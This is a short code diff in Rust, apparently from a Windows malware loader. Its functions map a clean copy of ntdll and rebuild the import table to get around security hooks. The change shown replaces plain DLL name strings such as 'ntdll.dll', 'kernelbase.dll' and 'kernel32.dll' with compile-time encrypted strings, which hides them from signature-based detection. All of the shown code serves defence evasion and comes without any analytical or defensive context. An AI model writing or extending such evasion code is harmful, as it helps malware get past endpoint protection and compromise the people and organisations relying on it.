@@ -142,7 +142,7 @@ fn map_clean_ntdll() -> Result<usize> {
                 if !base.is_null() && name.Buffer != std::ptr::null_mut() {
                     let name_slice = std::slice::from_raw_parts(name.Buffer, (name.Length / 2) as usize);
                     let name_str = String::from_utf16_lossy(name_slice).to_lowercase();
-                    if name_str.contains("ntdll.dll") {
+                    if name_str.contains(String::from_utf8_lossy(&string_crypt::enc_str!("ntdll.dll")).trim_end_matches('\0')) {
                         found_base = base as usize;
                         break;
                     }
@@ -541,7 +541,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
         let dll_lower = dll_name.to_lowercase();
         
         // Critical DLLs we explicitly want clean copies of
-        let is_critical = dll_lower == "ntdll.dll" || dll_lower == "kernelbase.dll" || dll_lower == "kernel32.dll";
+        let is_critical = dll_lower == String::from_utf8_lossy(&string_crypt::enc_str!("ntdll.dll")).trim_end_matches('\0') || dll_lower == String::from_utf8_lossy(&string_crypt::enc_str!("kernelbase.dll")).trim_end_matches('\0') || dll_lower == String::from_utf8_lossy(&string_crypt::enc_str!("kernel32.dll")).trim_end_matches('\0');
         
         let dep_handle = if is_critical {
             // map recursively clean
